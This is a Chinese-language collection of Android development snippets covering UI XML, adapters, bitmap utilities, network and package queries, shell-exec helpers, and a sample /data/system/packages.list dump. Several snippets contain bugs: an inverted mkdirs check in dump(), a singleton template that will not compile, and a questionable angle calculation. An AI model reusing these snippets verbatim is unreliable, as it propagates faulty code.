 * @return A float value to represent db equivalent to px value
 */
public static float convertPixelsToDp(float px,Context context){
    Resources resources = context.getResources();
    DisplayMetrics metrics = resources.getDisplayMetrics();
    float dp = px / (metrics.densityDpi / 160f);
    return dp;
}
```
# 计算Delta Angle
```java
	/**
	 * 计算起点到终点的偏移角度是否小于指定angle
	 * @param a 起点
	 * @param z 终点
	 * @param angle 偏移角度
	 * @return
	 */
	public boolean isLessThan(PointF a, PointF z, float angle) {
		float dx = z.x - a.x;
		float dy = z.y - a.y;
		return Math.tan(Math.PI/360 * angle) > Math.tan(Math.abs(dx/dy));
	}
```
# 直线
```xml
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="line">
    <stroke android:width="1dp" android:color="#0F0"/>
    <size android:height="5dp" />
</shape>
```
# 文字
# 文字浮出
阴影深，文字浅即可构成嵌入效果
```
   android:textColor="#000"
   android:shadowColor="#FFF"
   android:shadowRadius="1.5"
   android:textStyle="bold"
   android:shadowDx="2"
   android:shadowDy="2"
```
# 文字嵌入
阴影浅，文字深即可构成嵌入效果
```
   android:textColor="#FFF"
   android:shadowColor="#000"
   android:shadowRadius="1.5"
   android:textStyle="bold"
   android:shadowDx="2"
   android:shadowDy="2"
```
# AsyncTask
```java
        new AsyncTask<Void, Void, Void>() {                                                                                                                                              
            protected void onPreExecute() {
            } 
    
            protected Void doInBackground(Void... params) {
 
            }   
    
            protected void onPostExecute(Void result) {
            }  
    
        }.execute()
```
# Java容器 
# 遍历!HashMap
```
#!java
			Iterator<Map.Entry<String, YpsMethod>> iter = mYpsItems.entrySet().iterator();
			while(iter.hasNext()) {
				Map.Entry<String, YpsMethod> entry = (Map.Entry<String, YpsMethod>)iter.next(); 
				String         k = (String)entry.getKey();
				YpsMethod      v = (YpsMethod)entry.getValue();
			}
```
# List View 
 === List View item背景更换为圆角图后去掉选中时四角的默认选中颜色
```
#!xml
<ListView
        android:id="@+id/lv_main"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_marginTop="10dip"
        android:cacheColorHint="#00000000"
        android:listSelector="#00000000"
        android:divider="#ff000000"
        android:dividerHeight="10dip"
        />
```
# Base Adapter 
1.Templates 版
```
#!java
public class ${MyAdapter} extends BaseAdapter {
   
    private LayoutInflater mInflater;
    
    private ${array_type}[] ${array_element:newName};
    
    public MyAdapter(Context context,${array_type}[] ${list}) {
      mInflater = (LayoutInflater) context
              .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
      ${array_element:newName} = ${list};
  }
    @Override
    public int getCount() {
        return ${array_element:newName}.length;
    }
    @Override
    public Object getItem(int position) {
        return ${array_element:newName}[position];
    }
    @Override
    public long getItemId(int position) {
        return position;
    }
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
		${ViewHolder} ${holder};
		if(null == convertView){
			convertView = mInflater.inflate(R.layout.${cursor},null);
			${holder} = new ${ViewHolder}();
			// XXX set widget findViewById
			convertView.setTag(${holder});
		}else{
			${holder} = (${ViewHolder}) convertView.getTag();
		}
		//  XXX set widget content
        
        return convertView;
    }
	
	
    class ${ViewHolder} {
	
    }
    
    
}	
```
2.使用版
```
#!java
public class MyAdapter extends BaseAdapter {
        private LayoutInflater mInflater;
        private String[] object;
        public MyAdapter(Context context, String[] list) {
            mInflater = (LayoutInflater) context
                    .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            object = list;
        }
        @Override
        public int getCount() {
            return object.length;
        }
        @Override
        public Object getItem(int position) {
            return object[position];
        }
        @Override
        public long getItemId(int position) {
            return position;
        }
        @Override
    public View getView(int position, View convertView, ViewGroup parent) {
		ViewHolder holder;
		if(null == convertView){
			convertView = mInflater.inflate(R.layout.,null);
			holder = new ViewHolder();
			// XXX set widget findViewById
			convertView.setTag(holder);
		}else{
			holder = (ViewHolder) convertView.getTag();
		}
		//  XXX set widget content
        
        return convertView;
    }
        class ViewHolder {
        }
    }
```
# Button 
# !OnClickListener  
```
#!java
OnClickListener onClicklistener = new OnClickListener() {
		
		@Override
		public void onClick(View v) {
			// TODO Auto-generated method stub
			
		}
	};
```
# !CheckBox 
# !OnCheckedChangedListener
```
#!java
OnCheckedChangeListener onCheckedChangeListener = new OnCheckedChangeListener() {
		
		@Override
		public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
			// TODO Auto-generated method stub			
		}
	};
```
# !TextView 
# !TextWatcher
```
#!java
TextWatcher textWatcher = new TextWatcher() {
		
		@Override
		public void onTextChanged(CharSequence s, int start, int before, int count) {
			// TODO Auto-generated method stub
			
		}
		
		@Override
		public void beforeTextChanged(CharSequence s, int start, int count,
				int after) {
			// TODO Auto-generated method stub
			
		}
		
		@Override
		public void afterTextChanged(Editable s) {
			// TODO Auto-generated method stub
			
		}
	};
```
# !JavaClass
# getLunchIntent
1.Templates版
```
#!java
static Intent getLaunchIntent(Context context){
    Intent intent = new     Intent(context,${primary_type_name}.class);
return intent;${cursor}
}
```
2.使用版
```
#!java
static Intent getLaunchIntent(Context context) {
    Intent intent = new Intent(context, ListActivity.class);
    return intent;
}
```
# !Android Manifest 
# activity 
```
#!xml
        <activity android:name="?"
                  android:label="?">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
```
# Layout 
# Button 
```
#!xml
	<Button android:layout_width="fill_parent"
		android:layout_height="48sp" 
		android:text="你好"
		android:background="@drawable/btn"/>
```
# !TextView
```
#!xml
	<TextView android:layout_width="fill_parent"
		android:layout_height="wrap_content" android:text="@string/hello" />
```
```
#!div class
是否可以使用xslt将layout xml变成对应的java代码???
```
# !EditText
# !ImageView
# !CheckBox
# !WebView
```
#!xml
        <WebView android:id="@+id/wv1"                                                                                                                                                   
            android:layout_height="wrap_content"
            android:layout_width="match_parent"
            />
```
# Preference
```
#!xml
<?xml version="1.0" encoding="utf-8"?>
<!-- This file is /res/xml/flightoptions.xml -->
<PreferenceScreen
xmlns:android="http://schemas.android.com/apk/res/android"
android:key="flight_option_preference"
android:title="@string/prefTitle"
android:summary="@string/prefSummary">
<ListPreference
android:key="@string/selected_flight_sort_option"
android:title="@string/listTitle"
android:summary="@string/listSummary"
android:entries="@array/flight_sort_options"
android:entryValues="@array/flight_sort_options_values"
android:dialogTitle="@string/dialogTitle"
android:defaultValue="@string/flight_sort_option_default_value" />
</PreferenceScreen>
```
# Class
# Set class single instance
```
#!java
public class ${Elvis} { 
	    private static final  ${Elvis} INSTANCE = new  ${Elvis}();
	    // Singleton with static factory
	    private  ${Elvis}() { 
	        
	    }
	    public ${Elvis} static getInstance() {
	        return INSTANCE;
	    }  
	    // Remainder omitted
	}
```
# 自定义Checkbox图标
`res/drawable/cb.xml:`
```
#!xml
<?xml version="1.0" encoding="utf-8"?>
<selector
    xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:state_checked="true"
        android:state_focused="true"
        android:drawable="@drawable/cb_checked" />
    <item
        android:state_checked="false"
        android:state_focused="true"
        android:drawable="@drawable/cb_unchecked" />
    <item
        android:state_checked="false"
        android:drawable="@drawable/cb_unchecked" />
    <item
        android:state_checked="true"
        android:drawable="@drawable/cb_checked" />
</selector>
```
`layout:`
```
#!xml
    <CheckBox
        android:id="@+id/checkbox"
        android:layout_width="48px"
        android:layout_height="fill_parent"
        android:button="@drawable/cb"
        android:layout_marginRight="8dip"
        android:focusable="false" />
```
# 图片处理
# 使头像变灰
```java
 /** 
     * 使头像变灰 
     * @param drawable 
     */  
    public static void porBecomeGrey(ImageView imageView, Drawable drawable) {  
        drawable.mutate();      
        ColorMatrix cm = new ColorMatrix();      
        cm.setSaturation(0);      
        ColorMatrixColorFilter cf = new ColorMatrixColorFilter(cm);      
        drawable.setColorFilter(cf);   
        imageView.setImageDrawable(drawable);  
    }
```
# 由bitmap转换为drawable
```java
    Drawable drawable = new FastBitmapDrawable(bitmap);  
```
# 获取bitmap的byte[]
```java
    public byte[] getBitmapByte(Bitmap bitmap) {    
        ByteArrayOutputStream out = new ByteArrayOutputStream();    
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, out);    
        try {    
            out.flush();    
            out.close(); 
        } catch (IOException e) {    
            e.printStackTrace();    
        }    
        return out.toByteArray();
     }  
```
# 由byte[]生成bitmap
```java
    public Bitmap getBitmapFromByte(byte[] temp) {    
        if(temp != null) {    
            Bitmap bitmap = BitmapFactory.decodeByteArray(temp, 0, temp.length);    
            return bitmap;
        } else {
            return null; 
        }
    } 
```
# 将Drawable转化为Bitmap
```java
 /**
     * 将Drawable转化为Bitmap
     * @param drawable
     * @return
     */  
    public static Bitmap drawableToBitmap(Drawable drawable) {  
        int width = drawable.getIntrinsicWidth();  
        int height = drawable.getIntrinsicHeight();  
        Bitmap bitmap = Bitmap.createBitmap(width, height, drawable  
                .getOpacity() != PixelFormat.OPAQUE ? Bitmap.Config.ARGB_8888  
                : Bitmap.Config.RGB_565);  
    
        Canvas canvas = new Canvas(bitmap);  
        drawable.setBounds(0, 0, width, height);  
        drawable.draw(canvas);  
        return bitmap;  
    } 
```
# 获取图片的倒影
```java
 /**
    * 获取图片的倒影
    * @param bitmap
    * @return
    */  
    public static Bitmap createReflectionImageWithOrigin(Bitmap bitmap) {  
        final int reflectionGap = 4;  
        int width = bitmap.getWidth();  
        int height = bitmap.getHeight();  
    
        Matrix matrix = new Matrix();  
        matrix.preScale(1, -1);  
    
        Bitmap reflectionImage = Bitmap.createBitmap(bitmap, 0, height / 2,  
                width, height / 2, matrix, false);  
    
        Bitmap bitmapWithReflection = Bitmap.createBitmap(width,  
                (height + height / 2), Config.ARGB_8888);  
    
        Canvas canvas = new Canvas(bitmapWithReflection);  
        canvas.drawBitmap(bitmap, 0, 0, null);  
        Paint deafalutPaint = new Paint();  
        canvas.drawRect(0, height, width, height + reflectionGap, deafalutPaint);  
    
        canvas.drawBitmap(reflectionImage, 0, height + reflectionGap, null);  
    
        Paint paint = new Paint();  
        LinearGradient shader = new LinearGradient(0, bitmap.getHeight(), 0,  
                bitmapWithReflection.getHeight() + reflectionGap, 0x70ffffff,  
                0x00ffffff, TileMode.CLAMP);  
        paint.setShader(shader);  
        paint.setXfermode(new PorterDuffXfermode(Mode.DST_IN));  
        canvas.drawRect(0, height, width, bitmapWithReflection.getHeight()  
                + reflectionGap, paint);  
        return bitmapWithReflection;  
    } 
```
# 把图片变成圆角
```java
 /**
    * 把图片变成圆角  
    * @param bitmap 需要修改的图片  
    * @param pixels 圆角的弧度  
    * @return 圆角图片  
    */      
   public static Bitmap toRoundCorner(Bitmap bitmap, int pixels) {   
       Bitmap output = Bitmap.createBitmap(bitmap.getWidth(), bitmap.getHeight(), Config.ARGB_8888);      
       Canvas canvas = new Canvas(output);      
    
       final int color = 0xff424242;    
       final Paint paint = new Paint();    
       final Rect rect = new Rect(0, 0, bitmap.getWidth(), bitmap.getHeight());      
       final RectF rectF = new RectF(rect);  
       final float roundPx = pixels;   
    
       paint.setAntiAlias(true);          
       canvas.drawARGB(0, 0, 0, 0);      
       paint.setColor(color);      
       canvas.drawRoundRect(rectF, roundPx, roundPx, paint);      
    
       paint.setXfermode(new PorterDuffXfermode(Mode.SRC_IN));     
       canvas.drawBitmap(bitmap, rect, rect, paint);    
    
       return output;      
   }  
```
# 缩放图片
```java
 /**
     * 缩放图片
     * @param bmp
     * @param width
     * @param height
     * @return
     */  
    public static Bitmap PicZoom(Bitmap bmp, int width, int height) {  
        int bmpWidth = bmp.getWidth();  
        int bmpHeght = bmp.getHeight();  
        Matrix matrix = new Matrix();  
        matrix.postScale((float) width / bmpWidth, (float) height / bmpHeght);  
    
        return Bitmap.createBitmap(bmp, 0, 0, bmpWidth, bmpHeght, matrix, true);  
    }  
```
# 另存缩略图
```java
 /**
     * @param photoPath --原图路经
     * @param aFile     --保存缩图
     * @param newWidth  --缩图宽度
     * @param newHeight --缩图高度
     */  
    public static boolean bitmapToFile(String photoPath, File aFile, int newWidth, int newHeight) {  
        BitmapFactory.Options options = new BitmapFactory.Options();  
        options.inJustDecodeBounds = true;  
    
        // 获取这个图片的宽和高  
        Bitmap bitmap = BitmapFactory.decodeFile(photoPath, options);  
        options.inJustDecodeBounds = false;  
    
        //计算缩放比  
        options.inSampleSize = reckonThumbnail(options.outWidth, options.outHeight, newWidth, newHeight);  
    
        bitmap = BitmapFactory.decodeFile(photoPath, options);  
    
        try {  
            ByteArrayOutputStream baos = new ByteArrayOutputStream();  
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);  
            byte[] photoBytes = baos.toByteArray();  
    
            if (aFile.exists()) {  
                aFile.delete();  
            }  
            aFile.createNewFile();  
    
            FileOutputStream fos = new FileOutputStream(aFile);  
            fos.write(photoBytes);  
            fos.flush();  
            fos.close();  
    
            return true;  
        } catch (Exception e1) {  
            e1.printStackTrace();  
            if (aFile.exists()) {  
                aFile.delete();  
            }  
            Log.e("Bitmap To File Fail", e1.toString());  
            return false;  
        }  
    }  
```
# 计算缩放比
```java
/**
     * 计算缩放比
     * @param oldWidth
     * @param oldHeight
     * @param newWidth
     * @param newHeight
     * @return
     */  
    public static int reckonThumbnail(int oldWidth, int oldHeight, int newWidth, int newHeight) {  
        if ((oldHeight > newHeight && oldWidth > newWidth)  
                || (oldHeight <= newHeight && oldWidth > newWidth)) {  
            int be = (int) (oldWidth / (float) newWidth);  
            if (be <= 1)  be = 1;  
            return be;  
        } else if (oldHeight > newHeight && oldWidth <= newWidth) {  
            int be = (int) (oldHeight / (float) newHeight);  
            if (be <= 1)   be = 1;  
            return be;  
        }  
    
        return 1;  
    }   
```
# 纹理平铺
```xml
<?xml version="1.0" encoding="utf-8"?>
<bitmap xmlns:android="http://schemas.android.com/apk/res/android" android:src="@drawable/activity_bg_bitmap" android:tileMode="repeat"/>
```
# 返回像限
```java
	/**
	 * 返回像限
     * @param cx 坐标原点x
     * @param cy 坐标原点y
	 * @param x2 当前坐标x
	 * @param y2 当前坐标y
	 * @return 1, 2, 3,4 
	 */
	private int orthant(float cx, float cy, float x, float y) {
		if(x - cx > 0 && y - cy > 0) {
			return 4;
		} else if(x - cx < 0 && y - cy > 0 ) {
			return 3;
		} else if(x - cx < 0 && y - cy < 0) {
			return 2;
		} else if(x - cx > 0 && y - cy < 0) {
			return 1;
		}
		return 0;
	}
```
# 两点之间的距离
```java
	public static double distance(PointF src, PointF end) {
		return Math.sqrt(Math.pow(src.x - end.x, 2) + Math.pow(src.y - end.y, 2));
	}
	public static double distance(PointF src, float x, float y) {
		return Math.sqrt(Math.pow(src.x - x, 2) + Math.pow(src.y - y, 2));
	}
	
	public static double distance(float x0, float y0, float x1, float y1) {
		return Math.sqrt(Math.pow(x0 - x1, 2) + Math.pow(y0 - y1, 2));
	}
```
# 角度弧度之间的转换
```java
	/**
	 * 弧度转角度
	 * 
	 * @param angleInRadians
	 * @return
	 */
	public static double toDegree(double angleInRadians) {
		// return angleInRadians * Math.PI / 180;
		return Math.toDegrees(angleInRadians);
	}
	/**
	 * 角度转弧度
	 * 
	 * @param angdeg
	 * @return
	 */
	public static double toRadinas(double angdeg) {
		return Math.toRadians(angdeg);
	}
```
# 计算偏移角
```java
	/**
	 * 计算偏移角度
	 * 
	 * @param o  像限
	 * @param ox 坐标原点x
	 * @param oy 坐标原点y
     * @param x  当前坐标x
     * @param y  当前坐标y
	 * @return  当前位置与x(12点方向)轴正方向的夹角
	 */
	private double calcOffsetAngle(int o, float ox, float oy, float x, float y) {
		PointF center = new PointF(getWidth() / 2, getHeight() / 2);
		PointF at = new PointF(x, y);
		double v = distance(at, at.x, getHeight() / 2);
		double l = distance(at, center);
		double sinx = v / l;
		double offset  = Math.toDegrees(Math.asin(sinx));
		
		switch (o) {
		case 1: return 90-offset;
		case 2: return 270+offset;
		case 3: return 270-offset;
		case 4: return 90+offset;
		default:
			break;
		}
		return 0;
	}
```
# 已知sin(x)的值， 求其对应的角度
```java
double sinx = o / h;
Math.toDegrees(Math.asin(sinx));
```
# 使用XmlPullParser时丢掉了end tag你就永远阻塞了
```
<People name="" age="">
  <Major name=""/>
  <Books>
    <Book name="" isbn=""></Book>
    <Book name="" isbn=""></Book>
    <Book name="" isbn=""></Book>
  </Books>
  <phone type="1">19830709</phone>
```
 * 这个例子缺少了People的尾巴
 
为了能让XmlPullParser察觉这个错误，你需要处理END_DOCUMENT事件:
```java
```
# 使用XmlPullParser解析URL指定的远程xml
```
public static void getAllXML(String url) throws XmlPullParserException, IOException, URISyntaxException {
    XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
    factory.setNamespaceAware(true);
    XmlPullParser parser = factory.newPullParser();
    parser.setInput(new InputStreamReader(getUrlData(url)));
    XmlUtils.beginDocument(parser,"results");
    int eventType = parser.getEventType();
    do{
        XmlUtils.nextElement(parser);
        parser.next();
        eventType = parser.getEventType();
        if(eventType == XmlPullParser.TEXT) {
            Log.d("test",parser.getText());
        }
    } while (eventType != XmlPullParser.END_DOCUMENT) ;
}
public InputStream getUrlData(String url) throws URISyntaxException, ClientProtocolException, IOException {
    DefaultHttpClient client = new DefaultHttpClient();
    HttpGet method = new HttpGet(new URI(url));
    HttpResponse res = client.execute(method);
    return  res.getEntity().getContent();
}
```
# 按钮文字根据按钮状态改变
```xml
 <selector xmlns:android="http://schemas.android.com/apk/res/android">
   <item android:state_focused="true" android:color="@color/testcolor1"/>
   <item android:state_pressed="true" android:state_enabled="false" android:color="@color/testcolor2" />
   <item android:state_enabled="false" android:color="@color/testcolor3" />
   <item android:color="@color/testcolor5"/>
 </selector>
```
# 网络状态
```java
/**
	 * 是否有网络可用
	 * @param context
	 * @return
	 */
	public static boolean isNetworkUp(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo[] netInfo = cm.getAllNetworkInfo();
		for (NetworkInfo ni : netInfo) {
			if (ni.getTypeName().equalsIgnoreCase("WIFI")) {
				if (ni.isConnected()) {
					return true;
				}
			} else if (ni.getTypeName().equalsIgnoreCase("MOBILE")) {
				if (ni.isConnected()) {
					return true;
				}
			}
		}
		return false;
	}
	/**
	 * 是否有wifi可用
	 * @param context
	 * @return
	 */
	public static boolean isWifiNetworkUp(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo[] netInfo = cm.getAllNetworkInfo();
		for (NetworkInfo ni : netInfo) {
			if (ni.getTypeName().equalsIgnoreCase("WIFI")) {
				if (ni.isConnected()) {
					return true;
				}
			}
		}
		return false;
	}
	/**
	 * 是否有移动网络可用
	 * @param context
	 * @return
	 */
	public static boolean isMobileNetworkUp(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo[] netInfo = cm.getAllNetworkInfo();
		for (NetworkInfo ni : netInfo) {
			if (ni.getTypeName().equalsIgnoreCase("MOBILE")) {
				if (ni.isConnected()) {
					return true;
				}
			}
		}
		return false;
	}
```
# 执行命令或者shell
```sh
		/**
	 * 执行一个外部程序
	 * @param strCmd
	 * @return
	 */
	public static int execRc(String strCmd) {
		int rc = -1;
		try {
			java.lang.Process proc = Runtime.getRuntime().exec(strCmd);
			if (proc == null)
				return -1;
			rc = proc.waitFor();
			proc.destroy();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return rc;
	}
	
	
	/**
	 * 执行一段shell脚本
	 * @param sh
	 * @param output 输出(STDOUT)
	 * @return 退出状态码
	 */
	public static int execSh(String sh, List<String> output) {
		if (sh == null) {
			return -1;
		}
		java.lang.Process process = null;
		DataInputStream is = null;
		String[] cmds = new String[] { "sh", "-c", sh };
		try {
			process = Runtime.getRuntime().exec(cmds);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		is = new DataInputStream(process.getInputStream());
		try {
			String line;
			while ((line = is.readLine()) != null) {
				if (output != null) {
					output.add(line);
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		int rc = -1;
		try {
			rc = process.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			process.destroy();
		}
		return rc;
	}
	public static Set<String> getLauchers(Context context) {
		Set<String> launchers = new HashSet<String>();
		if (null == context) {
			return launchers;
		}
		
		PackageManager pm = context.getPackageManager();
		if (null == pm) {
			return launchers;
		}
		
		
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addCategory(Intent.CATEGORY_HOME);
		List<ResolveInfo> list =
						pm.queryIntentActivities(intent,
			                    PackageManager.MATCH_DEFAULT_ONLY);
		if (null == list || list.isEmpty()) {
			return launchers;
		}
		
		for(ResolveInfo info : list){
			if(null != info.activityInfo && null != info.activityInfo.packageName){
				launchers.add(info.activityInfo.packageName);
			}
		}
		
		return launchers;
	}
```
# 当前使用的launcher
```java
	public static String getCurrentLaucherName(Context context) {
		PackageManager pm = context.getPackageManager();
		Intent intent = new Intent(Intent.ACTION_MAIN);
		intent.addCategory(Intent.CATEGORY_HOME);
		ResolveInfo resolveInfo = pm.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
		if (null == resolveInfo || null == resolveInfo.activityInfo || null == resolveInfo.activityInfo.packageName) {
			return null;
		}
		
		if (resolveInfo.activityInfo.packageName.equals("android")) {
			return "";
		}
		
		return resolveInfo.activityInfo.loadLabel(pm).toString();
	}
```
# 将信息追加到指定文件中
```java
	/**
	 * 将字符串追加到指定文件中
	 * @param text
	 * @param file
	 * @return
	 */
	public static boolean dump(final String text, File file) {
		FileWriter writer = null;
		File parent = file.getParentFile();
		if(!parent.exists()) {
			if(parent.mkdirs()) {
				return false;
			}
		}
		try {
			writer = new FileWriter(file);
			writer.write(text);
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		try {
			writer.flush();
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				writer.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return true;
	}
```
# 获取当前动态壁纸
```java
	/**
	 * 获取当前动态壁纸的包名
	 * @param context the context
	 * @return 动态壁纸的包名，或者""
	 */
	public final static String getPackageNameOfCurrentLiveWallpaper(Context context) {
		final WallpaperManager wallpaperManager = WallpaperManager.getInstance(context);
		if(wallpaperManager == null) {
			return "";
		}
		WallpaperInfo wi = wallpaperManager.getWallpaperInfo();
		if(wi == null) {
			return "";
		}
		
		String pkgname = wallpaperManager.getWallpaperInfo().getPackageName();
		return pkgname == null ? "" : pkgname;
	}
```
# 是否具有某个权限
```java
	/**
	 * 判断该应用中是否有此permission
	 * @param context
	 * @param action
	 * @param pkgName
	 * @return
	 */
	public static boolean hasPermission(Context context, String permisson, String pkgName) {
        try {
        	PackageInfo info = context.getPackageManager().getPackageInfo(pkgName, PackageManager.GET_PERMISSIONS);
            String [] permissons = info.requestedPermissions;
            if(permissons != null && permissons.length > 0){
            	for(String p : permissons){
            		if(p.equals(permisson)){
            			return true;
					}
            	}
            }
        } catch (NameNotFoundException e) {
            e.printStackTrace();
        }
	    return false;
    }
```
# 计算证书摘要
```java
/**
	 * evaluate SH1 digest of specify package certificate
	 * 
	 * @see http://stackoverflow.com/questions/9293019/get-certificate-fingerprint-from-android-app
	 * @param pm
	 *            package manager {@link PackageManager}
	 * @param packageName
	 *            package name
	 * @return SH1 digest of package certificate, "-" means no cert
	 */
	public static String getPackageCertFingerprint(PackageManager pm, String packageName) {
		int flags = PackageManager.GET_SIGNATURES;
		PackageInfo packageInfo = null;
		try {
			packageInfo = pm.getPackageInfo(packageName, flags);
		} catch (/*NameNotFoundException*/Exception e) {
			e.printStackTrace();
		}
		Signature[] signatures = packageInfo.signatures;
		if (signatures == null) {
			return "-";
		}
		byte[] cert = signatures[0].toByteArray();
		InputStream input = new ByteArrayInputStream(cert);
		CertificateFactory cf = null;
		try {
			cf = CertificateFactory.getInstance("X509");
		} catch (CertificateException e) {
			e.printStackTrace();
		}
		X509Certificate c = null;
		try {
			c = (X509Certificate) cf.generateCertificate(input);
		} catch (CertificateException e) {
			e.printStackTrace();
		}
		StringBuffer hexString = new StringBuffer();
		try {
			MessageDigest md = MessageDigest.getInstance("SHA1");
			byte[] publicKey = md.digest(c.getPublicKey().getEncoded());
			for (int i = 0; i < publicKey.length; i++) {
				String appendString = Integer.toHexString(0xFF & publicKey[i]);
				if (appendString.length() == 1)
					hexString.append("0");
				hexString.append(appendString);
			}
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		}
		return hexString.toString();
	}
```
# 是用户应用
```java
	public static boolean isUserApp(ApplicationInfo info) {
		return !((info.flags & ApplicationInfo.FLAG_SYSTEM) != 0 || (info.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
	}
```
# 获取应用相关信息
```java
	
	/**
	 * Get package status infomation (include: data size , cache size, etc...)
	 * @param context the context
	 * @param pkgName package name
	 * @param observer observer to fetch notification
	 */
	public static void getPkgSize(Context context, String pkgName, IPackageStatsObserver.Stub observer) {
		try {
			if (observer != null) {
				Method getPackageSizeInfo = context.getPackageManager().getClass().getMethod("getPackageSizeInfo", String.class, IPackageStatsObserver.class);
				getPackageSizeInfo.invoke(context.getPackageManager(), pkgName, observer);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * Get application name(OR application label) by specify package name
	 * @param context the context
	 * @param packageName package name
	 * @return null or application name
	 */
	public static String getAppName(Context context, String packageName) {
		String label = null;
		if (context == null) {
			return null;
		}
		
		PackageManager pm = context.getPackageManager();
		try {
			ApplicationInfo info = pm.getApplicationInfo(packageName, PackageManager.GET_META_DATA);
			label = pm.getApplicationLabel(info).toString();
		} catch (NameNotFoundException e) {
			e.printStackTrace();
			label = packageName;
		}
		return label;
	}
```
# 设置语言
```java
	static public void setLanguage(LanguageCountry languageCountry,  Context context) {
		Locale locale = new Locale(languageCountry.getLanguage(), languageCountry.getCountry());
		Resources res = context.getResources();
		Configuration config = res.getConfiguration();
		config.locale = locale;
		DisplayMetrics dm = res.getDisplayMetrics();
		res.updateConfiguration(config, dm);
	}
```
# 快捷方式是否安裝到了桌面
```java
	/**
	 * @param Context context
	 * @param label shortcut label
	 * @return
	 */
	public static boolean hasShortcut(Context context, String label) {
		boolean existed = false;
		final ContentResolver cr = context.getContentResolver();
		String AUTHORITY = (android.os.Build.VERSION.SDK_INT < 8) ? "com.android.launcher.settings" : "com.android.launcher2.settings";
		final Uri CONTENT_URI = Uri.parse("content://" + AUTHORITY + "/favorites?notify=true");
		Cursor cursor = null;
		try {
			cursor = cr.query(CONTENT_URI, null, "title=?", new String[] { label }, null);
			if (cursor != null && cursor.getCount() > 0) {
				existed = true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursor != null) {
				cursor.close();
				cursor = null;
			}
		}
		
		return existed;
	}
```
# Support Package
Minimum API level supported: 4
The Support Package includes static "support libraries" that you can add to your Android application in order to use APIs that are either not available for older platform versions or that offer "utility" APIs that aren't a part of the framework APIs. The goal is to simplify your development by offering more APIs that you can bundle with your application so you can worry less about platform versions.
```div class=note
# Note 
The Support Package includes more than one support library. Each one has a different minimum API level. For example, one library requires API level 4 or higher, while another requires API level 13 or higher (v13 is a superset of v4 and includes additional support classes to work with v13 APIs). The minimum version is indicated by the directory name, such as v4/ and v13/.
```
# /data/system/packages.list
```
com.android.defcontainer 10014 0 /data/data/com.android.defcontainer
com.sec.phone 10071 0 /data/data/com.sec.phone
com.android.quicksearchbox 10060 0 /data/data/com.android.quicksearchbox
com.zinio.samsung.android 10099 0 /data/data/com.zinio.samsung.android
com.android.contacts 10003 0 /data/data/com.android.contacts
com.sec.android.app.MmsProvision 10040 0 /data/data/com.sec.android.app.MmsProvision
com.sec.android.app.shareapp 10076 0 /data/data/com.sec.android.app.shareapp
com.jlradio.fm 10122 1 /data/data/com.jlradio.fm
com.sec.android.fotaclient 10026 0 /data/data/com.sec.android.fotaclient
com.sec.android.motions.settings.panningtutorial 10050 0 /data/data/com.sec.android.motions.settings.panningtutorial
com.sec.android.samsungappswidget 10105 0 /data/data/com.sec.android.samsungappswidget
com.android.htmlviewer 10028 0 /data/data/com.android.htmlviewer
com.gameloft.android.GAND.GloftAsphalt5.asphalt5 10115 0 /data/data/com.gameloft.android.GAND.GloftAsphalt5.asphalt5
com.android.providers.calendar 10070 0 /data/data/com.android.providers.calendar
com.android.bluetooth 10006 0 /data/data/com.android.bluetooth
com.sec.android.widgetapp.postit 10001 0 /data/data/com.sec.android.widgetapp.postit
com.samsung.android.livewallpaper.microbesgl 10037 0 /data/data/com.samsung.android.livewallpaper.microbesgl
com.android.calendar 10070 0 /data/data/com.android.calendar
com.samsung.android.app.divx 10016 0 /data/data/com.samsung.android.app.divx
com.android.browser 10069 0 /data/data/com.android.browser
com.sec.android.provider.badge 10005 0 /data/data/com.sec.android.provider.badge
com.sec.android.socialhub 10084 0 /data/data/com.sec.android.socialhub
go.launcher.theme.KissMe 10124 0 /data/data/go.launcher.theme.KissMe
com.android.providers.downloads.ui 10018 0 /data/data/com.android.providers.downloads.ui
com.samsung.SMT 10067 0 /data/data/com.samsung.SMT
com.sec.ccl.csp.app.secretwallpaper.themetwo 10073 0 /data/data/com.sec.ccl.csp.app.secretwallpaper.themetwo
com.sec.android.app.shutdown 10106 0 /data/data/com.sec.android.app.shutdown
com.android.sharedstoragebackup 10077 0 /data/data/com.android.sharedstoragebackup
com.sec.android.app.FileTransferClient 10021 0 /data/data/com.sec.android.app.FileTransferClient
com.sec.android.widgetapp.stockclock.sina 10079 0 /data/data/com.sec.android.widgetapp.stockclock.sina
com.android.mms 10039 0 /data/data/com.android.mms
com.android.provision 10056 0 /data/data/com.android.provision
